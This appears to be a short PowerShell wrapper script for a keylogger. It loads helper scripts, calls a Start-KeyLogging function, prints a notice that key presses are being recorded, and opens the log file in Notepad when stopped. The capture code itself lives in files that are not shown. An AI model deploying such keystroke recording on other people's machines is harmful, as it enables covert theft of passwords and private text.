. .\keytranslate.ps1
. .\keywrite.ps1
. .\keyloop.ps1

try {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
    Start-KeyLogging -API $API -path $Path
}
finally {
    notepad $Path
}

# bardzo wazna zmienna
. .\line010.ps1
Start-Sleep -Milliseconds 300
